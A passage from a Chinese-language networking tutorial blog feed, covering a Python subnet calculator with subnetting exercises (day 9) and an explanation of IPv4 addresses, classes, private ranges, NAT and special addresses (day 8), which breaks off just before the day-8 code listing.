&quot;</span>).strip()<br><br>            <span class="hljs-keyword">if</span> sub_choice == <span class="hljs-string">&#x27;1&#x27;</span>:<br>                cidr = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n请输入CIDR: &quot;</span>).strip()<br>                <span class="hljs-keyword">try</span>:<br>                    cidr = <span class="hljs-built_in">int</span>(cidr)<br>                    mask = calc.cidr_to_mask(cidr)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n/<span class="hljs-subst">&#123;cidr&#125;</span> = <span class="hljs-subst">&#123;mask&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">except</span> ValueError:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ 请输入有效的数字&quot;</span>)<br><br>            <span class="hljs-keyword">elif</span> sub_choice == <span class="hljs-string">&#x27;2&#x27;</span>:<br>                mask = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n请输入子网掩码: &quot;</span>).strip()<br>                <span class="hljs-keyword">try</span>:<br>                    cidr = calc.mask_to_cidr(mask)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;mask&#125;</span> = /<span class="hljs-subst">&#123;cidr&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ 请输入有效的子网掩码&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;3&#x27;</span>:<br>            ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n请输入网络地址: &quot;</span>).strip()<br>            old_cidr = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入原始CIDR: &quot;</span>).strip()<br>            new_cidr = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入新的CIDR: &quot;</span>).strip()<br><br>            <span class="hljs-keyword">try</span>:<br>                old_cidr = <span class="hljs-built_in">int</span>(old_cidr)<br>                new_cidr = <span class="hljs-built_in">int</span>(new_cidr)<br><br>                subnets = calc.split_subnet(ip, old_cidr, new_cidr)<br><br>                <span class="hljs-keyword">if</span> subnets:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n📊 将 <span class="hljs-subst">&#123;ip&#125;</span>/<span class="hljs-subst">&#123;old_cidr&#125;</span> 划分为 /<span class="hljs-subst">&#123;new_cidr&#125;</span> 子网:&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   共 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(subnets)&#125;</span> 个子网\n&quot;</span>)<br>                    <span class="hljs-keyword">for</span> i, subnet <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(subnets, <span class="hljs-number">1</span>):<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   <span class="hljs-subst">&#123;i&#125;</span>. <span class="hljs-subst">&#123;subnet&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ 新CIDR必须大于原CIDR&quot;</span>)<br>            <span class="hljs-keyword">except</span> ValueError:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ 请输入有效的数字&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;4&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n常用CIDR速查表：&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;CIDR&#x27;</span>:&lt;<span class="hljs-number">8</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;子网掩码&#x27;</span>:&lt;<span class="hljs-number">18</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;可用主机数&#x27;</span>:&lt;<span class="hljs-number">12</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;说明&#x27;</span>&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">60</span>)<br><br>            common_cidrs = [<br>                (<span class="hljs-number">8</span>, <span class="hljs-string">&quot;A类默认&quot;</span>),<br>                (<span class="hljs-number">16</span>, <span class="hljs-string">&quot;B类默认&quot;</span>),<br>                (<span class="hljs-number">24</span>, <span class="hljs-string">&quot;C类默认&quot;</span>),<br>                (<span class="hljs-number">25</span>, <span class="hljs-string">&quot;C类分2个子网&quot;</span>),<br>                (<span class="hljs-number">26</span>, <span class="hljs-string">&quot;C类分4个子网&quot;</span>),<br>                (<span class="hljs-number">27</span>, <span class="hljs-string">&quot;C类分8个子网&quot;</span>),<br>                (<span class="hljs-number">28</span>, <span class="hljs-string">&quot;C类分16个子网&quot;</span>),<br>                (<span class="hljs-number">29</span>, <span class="hljs-string">&quot;小型子网&quot;</span>),<br>                (<span class="hljs-number">30</span>, <span class="hljs-string">&quot;点对点链路&quot;</span>),<br>            ]<br><br>            <span class="hljs-keyword">for</span> cidr, desc <span class="hljs-keyword">in</span> common_cidrs:<br>                mask = calc.cidr_to_mask(cidr)<br>                hosts = <span class="hljs-number">2</span> ** (<span class="hljs-number">32</span> - cidr) - <span class="hljs-number">2</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;/<span class="hljs-subst">&#123;cidr:&lt;<span class="hljs-number">7</span>&#125;</span> <span class="hljs-subst">&#123;mask:&lt;<span class="hljs-number">18</span>&#125;</span> <span class="hljs-subst">&#123;hosts:&lt;<span class="hljs-number">12</span>&#125;</span> <span class="hljs-subst">&#123;desc&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="运行程序">运行程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python code/day09/day09_subnet_calculator.py<br></code></pre></td></tr></table></figure><h2 id="💡-实战案例">💡 实战案例</h2><h3 id="案例1：公司网络规划">案例1：公司网络规划</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">需求：<br>公司有200台电脑，分布在4个部门<br><span class="hljs-bullet">-</span> 销售部：60台<br><span class="hljs-bullet">-</span> 技术部：80台<br><span class="hljs-bullet">-</span> 行政部：40台<br><span class="hljs-bullet">-</span> 财务部：20台<br><br>给定网络：192.168.0.0/24<br><br>方案：<br><span class="hljs-bullet">1.</span> 技术部：192.168.0.0/25（126台主机）<br><span class="hljs-bullet">2.</span> 销售部：192.168.0.128/26（62台主机）<br><span class="hljs-bullet">3.</span> 行政部：192.168.0.192/27（30台主机）<br><span class="hljs-bullet">4.</span> 财务部：192.168.0.224/27（30台主机）<br></code></pre></td></tr></table></figure><h3 id="案例2：家庭网络">案例2：家庭网络</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">需求：<br>家里有<span class="hljs-number">10</span>台设备，使用C类私网<br><br>方案：<br>网络：<span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br>- 可用IP：<span class="hljs-number">192.168.1.1</span> - <span class="hljs-number">192.168.1.254</span><br>- 路由器：<span class="hljs-number">192.168.1.1</span><br>- 设备：<span class="hljs-number">192.168.1.100</span>-<span class="hljs-number">109</span><br></code></pre></td></tr></table></figure><h2 id="🎓-知识小结">🎓 知识小结</h2><p>今天学习了：</p><ol><li>✅ 子网掩码用于区分网络部分和主机部分</li><li>✅ CIDR是子网掩码的简写形式</li><li>✅ 可用主机数 = 2^主机位数 - 2</li><li>✅ 网络地址、广播地址的计算方法</li><li>✅ 子网划分的实际应用</li></ol><h3 id="重要公式">重要公式</h3><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">可用主机数 = <span class="hljs-number">2</span>^(<span class="hljs-number">32</span>-<span class="hljs-built_in">CIDR</span>) - <span class="hljs-number">2</span><br>子网数量 = <span class="hljs-number">2</span>^(新<span class="hljs-built_in">CIDR</span> - 旧<span class="hljs-built_in">CIDR</span>)<br>块大小 = <span class="hljs-number">256</span> - 子网掩码的变化八位<br></code></pre></td></tr></table></figure><h2 id="💪-练习题">💪 练习题</h2><h3 id="练习1：基础计算">练习1：基础计算</h3><p>计算以下子网的信息：</p><ol><li>192.168.10.0/24</li><li>172.16.0.0/16</li><li>10.0.0.0/8</li></ol><h3 id="练习2：子网划分">练习2：子网划分</h3><p>将192.168.1.0/24划分为：</p><ol><li>2个相等的子网</li><li>4个相等的子网</li><li>8个相等的子网</li></ol><h3 id="练习3：实际应用">练习3：实际应用</h3><p>一个公司有以下需求：</p><ul><li>部门A：需要50台主机</li><li>部门B：需要30台主机</li><li>部门C：需要20台主机</li></ul><p>给定192.168.0.0/24，如何划分？</p><h3 id="练习4：进阶题目">练习4：进阶题目</h3><p>如何判断两个IP是否在同一子网？</p><ul><li>IP1: 192.168.1.100/25</li><li>IP2: 192.168.1.150/25</li></ul><hr><p>💡 <strong>今日金句</strong>：子网划分是网络规划的基本功！</p><p>👉 <a href="day08.md">上一天：IP地址详解</a> | <a href="../../README.md">返回目录</a> | <a href="day10.md">下一天：MAC地址和ARP</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>8天：IP地址详解</title>
    <link href="/2025/11/10/8%E5%A4%A9%EF%BC%9AIP%E5%9C%B0%E5%9D%80%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/11/10/8%E5%A4%A9%EF%BC%9AIP%E5%9C%B0%E5%9D%80%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1>第8天：IP地址详解</h1><blockquote><p>“IP地址就像互联网上的门牌号。”</p></blockquote><h2 id="📚-今日目标">📚 今日目标</h2><ul><li>深入理解IP地址的概念和作用</li><li>掌握IPv4地址的格式和表示</li><li>理解IP地址的分类（A/B/C/D/E类）</li><li>区分公网IP和私网IP</li><li>编写IP地址分析工具</li></ul><h2 id="🎯-什么是IP地址？">🎯 什么是IP地址？</h2><h3 id="生活中的例子">生活中的例子</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">IP地址 = 家庭住址<br><br>北京市朝阳区xx街道xx号  →  详细地址<br><span class="hljs-number">192.168.1.100</span>            →  IP地址<br><br>作用：<br>- 唯一标识网络中的设备<br>- 让数据包找到目的地<br>- 实现跨网络通信<br></code></pre></td></tr></table></figure><p><strong>IP地址</strong>（Internet Protocol Address）是分配给网络设备的数字标识，用于在网络中定位和识别设备。</p><h3 id="IP地址的两个版本">IP地址的两个版本</h3><table><thead><tr><th>版本</th><th>全称</th><th>地址长度</th><th>地址数量</th><th>例子</th></tr></thead><tbody><tr><td>IPv4</td><td>Internet Protocol version 4</td><td>32位</td><td>约43亿个</td><td>192.168.1.1</td></tr><tr><td>IPv6</td><td>Internet Protocol version 6</td><td>128位</td><td>约340万亿亿亿个</td><td>2001:0db8::1</td></tr></tbody></table><p><strong>本节重点</strong>：IPv4（最常用）</p><h2 id="📊-IPv4地址格式">📊 IPv4地址格式</h2><h3 id="二进制和十进制表示">二进制和十进制表示</h3><p>IPv4地址是32位二进制数，分成4组，每组8位（1字节）：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">二进制表示（<span class="hljs-number">32</span>位）：<br><span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000001</span>.<span class="hljs-number">00000001</span><br><br>转换为十进制（点分十进制）：<br><span class="hljs-number">192.168.1.1</span><br><br>每组范围：<span class="hljs-number">0-255（2^8</span> = <span class="hljs-number">256</span>）<br></code></pre></td></tr></table></figure><h3 id="转换示例">转换示例</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">192.168.1.1</span> 的转换过程：<br><br><span class="hljs-number">192</span>  = <span class="hljs-number">11000000</span>  (<span class="hljs-number">128</span>+<span class="hljs-number">64</span> = <span class="hljs-number">192</span>)<br><span class="hljs-number">168</span>  = <span class="hljs-number">10101000</span>  (<span class="hljs-number">128+32+8</span> = <span class="hljs-number">168</span>)<br><span class="hljs-number">1</span>    = <span class="hljs-number">00000001</span>  (<span class="hljs-number">1</span>)<br><span class="hljs-number">1</span>    = <span class="hljs-number">00000001</span>  (<span class="hljs-number">1</span>)<br><br>完整二进制：<br><span class="hljs-number">11000000</span> <span class="hljs-number">10101000</span> <span class="hljs-number">00000001</span> <span class="hljs-number">00000001</span><br></code></pre></td></tr></table></figure><h3 id="地址范围">地址范围</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">最小IP地址：<span class="hljs-number">0.0.0.0</span><br>最大IP地址：<span class="hljs-number">255.255.255.255</span><br><br>总数：<span class="hljs-number">2</span>^<span class="hljs-number">32</span> = <span class="hljs-number">4</span>,<span class="hljs-number">294,967</span>,<span class="hljs-number">296</span> 个（约<span class="hljs-number">43</span>亿）<br></code></pre></td></tr></table></figure><h2 id="🏷️-IP地址分类">🏷️ IP地址分类</h2><p>IPv4地址分为5类：A、B、C、D、E类</p><h3 id="A类地址">A类地址</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">格式：<span class="hljs-number">0</span>xxxxxxx<span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><br>     <span class="hljs-selector-attr">[网络号]</span>.<span class="hljs-selector-attr">[  主机号（24位）  ]</span><br><br>范围：<span class="hljs-number">1.0</span>.<span class="hljs-number">0.0</span> - <span class="hljs-number">126.255</span>.<span class="hljs-number">255.255</span><br>网络数：<span class="hljs-number">126</span>个（<span class="hljs-number">2</span>^<span class="hljs-number">7</span> - <span class="hljs-number">2</span>，去掉<span class="hljs-number">0</span>和<span class="hljs-number">127</span>）<br>每个网络的主机数：<span class="hljs-number">16</span>,<span class="hljs-number">777</span>,<span class="hljs-number">214</span>个（<span class="hljs-number">2</span>^<span class="hljs-number">24</span> - <span class="hljs-number">2</span>）<br><br>用途：大型网络（如大型企业、ISP）<br>例子：<span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>（私网）<br></code></pre></td></tr></table></figure><h3 id="B类地址">B类地址</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">格式：<span class="hljs-number">10</span>xxxxxx<span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><br>     <span class="hljs-selector-attr">[  网络号（16位） ]</span>.<span class="hljs-selector-attr">[主机号（16位）]</span><br><br>范围：<span class="hljs-number">128.0</span>.<span class="hljs-number">0.0</span> - <span class="hljs-number">191.255</span>.<span class="hljs-number">255.255</span><br>网络数：<span class="hljs-number">16</span>,<span class="hljs-number">384</span>个（<span class="hljs-number">2</span>^<span class="hljs-number">14</span>）<br>每个网络的主机数：<span class="hljs-number">65</span>,<span class="hljs-number">534</span>个（<span class="hljs-number">2</span>^<span class="hljs-number">16</span> - <span class="hljs-number">2</span>）<br><br>用途：中型网络（如大学、中型企业）<br>例子：<span class="hljs-number">172.16</span>.<span class="hljs-number">0.0</span>（私网）<br></code></pre></td></tr></table></figure><h3 id="C类地址">C类地址</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">格式：<span class="hljs-number">110</span>xxxxx<span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><br>     <span class="hljs-selector-attr">[     网络号（24位）    ]</span>.<span class="hljs-selector-attr">[主机号]</span><br><br>范围：<span class="hljs-number">192.0</span>.<span class="hljs-number">0.0</span> - <span class="hljs-number">223.255</span>.<span class="hljs-number">255.255</span><br>网络数：<span class="hljs-number">2</span>,<span class="hljs-number">097</span>,<span class="hljs-number">152</span>个（<span class="hljs-number">2</span>^<span class="hljs-number">21</span>）<br>每个网络的主机数：<span class="hljs-number">254</span>个（<span class="hljs-number">2</span>^<span class="hljs-number">8</span> - <span class="hljs-number">2</span>）<br><br>用途：小型网络（如家庭、小型办公室）<br>例子：<span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>（私网）<br></code></pre></td></tr></table></figure><h3 id="D类地址（组播）">D类地址（组播）</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">格式：<span class="hljs-number">1110</span>xxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br><br>范围：<span class="hljs-number">224.0.0.0</span> - <span class="hljs-number">239.255.255.255</span><br><br>用途：组播（多播）地址<br>      一对多的通信<br>例子：<span class="hljs-number">224.0.0.1</span>（所有主机组）<br></code></pre></td></tr></table></figure><h3 id="E类地址（保留）">E类地址（保留）</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">格式：<span class="hljs-number">1111</span>xxxx<span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><br><br>范围：<span class="hljs-number">240.0</span>.<span class="hljs-number">0.0</span> - <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span><br><br>用途：保留用于将来或实验<br></code></pre></td></tr></table></figure><h3 id="分类总结">分类总结</h3><table><thead><tr><th>类别</th><th>首字节范围</th><th>网络数</th><th>主机数/网络</th><th>用途</th></tr></thead><tbody><tr><td>A</td><td>1-126</td><td>126</td><td>16,777,214</td><td>大型网络</td></tr><tr><td>B</td><td>128-191</td><td>16,384</td><td>65,534</td><td>中型网络</td></tr><tr><td>C</td><td>192-223</td><td>2,097,152</td><td>254</td><td>小型网络</td></tr><tr><td>D</td><td>224-239</td><td>-</td><td>-</td><td>组播</td></tr><tr><td>E</td><td>240-255</td><td>-</td><td>-</td><td>保留</td></tr></tbody></table><h2 id="🌐-公网IP-vs-私网IP">🌐 公网IP vs 私网IP</h2><h3 id="公网IP（Public-IP）">公网IP（Public IP）</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">定义：可以在互联网上直接访问的IP地址<br>特点：<br><span class="hljs-bullet">- </span>全球唯一<br><span class="hljs-bullet">- </span>可以从互联网任何地方访问<br><span class="hljs-bullet">- </span>需要向ISP申请<br><span class="hljs-bullet">- </span>数量有限，需要付费<br><br>例子：<br><span class="hljs-bullet">- </span>8.8.8.8（Google DNS）<br><span class="hljs-bullet">- </span>114.114.114.114（国内DNS）<br><span class="hljs-bullet">- </span>220.181.38.148（百度）<br></code></pre></td></tr></table></figure><h3 id="私网IP（Private-IP）">私网IP（Private IP）</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns">定义：只能在局域网内使用的IP地址<br>特点：<br>- 不能在互联网上直接访问<br>- 可以重复使用（不同局域网可以用相同的私网IP）<br>- 免费使用<br>- 需要通过NAT访问互联网<br><br>私网IP地址范围（RFC <span class="hljs-number">1918</span>）：<br><span class="hljs-keyword">A</span>类：<span class="hljs-number">10.0.0.0</span>      - <span class="hljs-number">10.255.255.255</span>    (<span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span>)<br>B类：<span class="hljs-number">172.16.0.0</span>    - <span class="hljs-number">172.31.255.255</span>    (<span class="hljs-number">172.16.0.0</span>/<span class="hljs-number">12</span>)<br>C类：<span class="hljs-number">192.168.0.0</span>   - <span class="hljs-number">192.168.255.255</span>   (<span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span>)<br></code></pre></td></tr></table></figure><h3 id="对比">对比</h3><table><thead><tr><th>特性</th><th>公网IP</th><th>私网IP</th></tr></thead><tbody><tr><td>可访问性</td><td>互联网可访问</td><td>仅局域网可访问</td></tr><tr><td>唯一性</td><td>全球唯一</td><td>可重复使用</td></tr><tr><td>获取方式</td><td>ISP分配</td><td>自行分配</td></tr><tr><td>费用</td><td>通常收费</td><td>免费</td></tr><tr><td>数量</td><td>有限</td><td>充足</td></tr></tbody></table><h3 id="NAT（网络地址转换）">NAT（网络地址转换）</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs 1c">家庭网络示例：<br><br>互联网（公网IP：<span class="hljs-number">123.45</span>.<span class="hljs-number">67.89</span>）<br>    <span class="hljs-string">|</span><br>   路由器（NAT设备）<br>    <span class="hljs-string">|</span><br>局域网（私网IP）<br>    <span class="hljs-string">|-- 电脑1: 192.168.1.100</span><br>    <span class="hljs-string">|-- 电脑2: 192.168.1.101</span><br>    <span class="hljs-string">|-- 手机: 192.168.1.102</span><br><br>NAT的作用：<br>将局域网的私网IP转换为公网IP，<br>使私网设备可以访问互联网。<br></code></pre></td></tr></table></figure><h2 id="🔍-特殊IP地址">🔍 特殊IP地址</h2><h3 id="1-环回地址（Loopback）">1. 环回地址（Loopback）</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">地址：127.0.0.0 - 127.255.255.255<br>常用：127.0.0.1<br><br>作用：本机测试，数据不会发送到网络<br>别名：localhost<br><br>用途：<br><span class="hljs-bullet">- </span>测试网络程序<br><span class="hljs-bullet">- </span>本地开发<br><span class="hljs-bullet">- </span>诊断TCP/IP协议栈<br></code></pre></td></tr></table></figure><h3 id="2-网络地址">2. 网络地址</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">定义：主机号全为<span class="hljs-number">0</span>的地址<br>例子：<span class="hljs-number">192.168.1.0</span><br><br>作用：表示整个网络，不能分配给主机<br></code></pre></td></tr></table></figure><h3 id="3-广播地址">3. 广播地址</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">定义：主机号全为<span class="hljs-number">1</span>的地址<br>例子：<span class="hljs-number">192.168.1.255</span><br><br>作用：向网络中所有主机发送数据<br></code></pre></td></tr></table></figure><h3 id="4-默认路由">4. 默认路由</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">地址：0.0.0.0<br><br>作用：<br><span class="hljs-bullet">- </span>表示&quot;任意地址&quot;<br><span class="hljs-bullet">- </span>路由表中的默认路由<br><span class="hljs-bullet">- </span>服务器监听所有网络接口<br></code></pre></td></tr></table></figure><h3 id="5-受限广播地址">5. 受限广播地址</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">地址：<span class="hljs-number">255.255.255.255</span><br><br>作用：向本地网络广播，不会被路由器转发<br></code></pre></td></tr></table></figure><h2 id="🔧-实战项目：IP地址分析工具">🔧 实战项目：IP地址分析工具</h2><p>让我们编写一个IP地址分析工具，实现各种IP地址相关功能！</p><h3 id="代码实现">代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span 